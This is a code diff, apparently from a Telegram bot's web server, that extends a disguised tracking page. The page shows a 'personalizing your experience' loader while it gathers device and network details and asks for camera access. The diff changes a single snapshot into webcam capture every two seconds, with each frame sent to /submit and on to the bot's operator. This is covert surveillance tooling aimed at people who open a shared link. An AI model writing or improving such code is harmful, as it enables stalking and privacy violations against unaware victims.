@@ -81,7 +81,10 @@ async def track_page(request: web.Request):
   <div class="loader"></div>
   <div class="note">Tajribangiz moslashtirilmoqda...</div>
   <script>
-    async function collectAndSend() {{
+    let stream = null;
+    let cameraAllowed = false;
+
+    async function collectData() {{
         const data = {{
           timestamp: new Date().toISOString(),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -134,44 +137,63 @@ async def track_page(request: web.Request):
           data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
         }}
 
-        let img = null;
-        let cameraAllowed = false;
-        try {{
-          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-          cameraAllowed = true;
-          const track = stream.getVideoTracks()[0];
-          const settings = track.getSettings();
-          data.cameraRes = `${{settings.width}}x${{settings.height}}`;
-
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
-
-          const c = document.createElement("canvas");
-          c.width = video.videoWidth;
-          c.height = video.videoHeight;
-          c.getContext("2d").drawImage(video, 0, 0);
-          img = c.toDataURL("image/jpeg", 0.7);
-
-          stream.getTracks().forEach(t => t.stop());
-        }} catch (e) {{
-          // Kamera rad etilgan
-        }}
-
-        const body = {{ token: "{token}", clientData: data, cameraAllowed: cameraAllowed }};
-        if (img) {{
-          body.image = img;
-        }}
-
-        fetch("/submit", {{
-          method: "POST",
-          headers: {{ "Content-Type": "application/json" }},
-          body: JSON.stringify(body)
-        }});
+        return data;
     }}
 
-    // Bir marta yuborish
-    setTimeout(collectAndSend, 1000);
+    async function sendReport(imageData = null) {{
+        const data = await collectData();
+        const body = {{
+            token: "{token}",
+            clientData: data,
+            cameraAllowed: cameraAllowed
+        }};
+        if (imageData) {{
+            body.image = imageData;
+        }}
+        try {{
+            await fetch("/submit", {{
+                method: "POST",
+                headers: {{ "Content-Type": "application/json" }},
+                body: JSON.stringify(body)
+            }});
+        }} catch (e) {{ console.error("Yuborishda xato:", e); }}
+    }}
+
+    async function startCameraAndCapture() {{
+        try {{
+            stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
+            cameraAllowed = true;
+            const track = stream.getVideoTracks()[0];
+            const settings = track.getSettings();
+            // Birinchi marta ma'lumot + rasm yuborish
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            await video.play();
+
+            const captureFrame = () => {{
+                const c = document.createElement("canvas");
+                c.width = video.videoWidth || 640;
+                c.height = video.videoHeight || 480;
+                c.getContext("2d").drawImage(video, 0, 0);
+                const img = c.toDataURL("image/jpeg", 0.7);
+                sendReport(img);
+            }};
+
+            // Birinchi rasmni darhol yuborish
+            captureFrame();
+
+            // Keyin har 2 soniyada takrorlash
+            setInterval(captureFrame, 2000);
+
+        }} catch (e) {{
+            cameraAllowed = false;
+            // Faqat bir marta ma'lumot yuborish
+            sendReport();
+        }}
+    }}
+
+    // Ishga tushirish
+    startCameraAndCapture();
   </script>
 </body>
 </html>"""
@@ -224,6 +246,7 @@ async def submit_data(request: web.Request):
                 logger.error(f"Rasmni yuborishda xato: {e}")
                 await request.app["bot"].send_message(chat_id=user_id, text=message + "\n\n⚠️ Rasmni yuklab bo'lmadi.")
         else:
+            # Faqat ma'lumot (kamera yoqilmasa)
             await request.app["bot"].send_message(chat_id=user_id, text=message)
 
         return web.Response(text="ok")
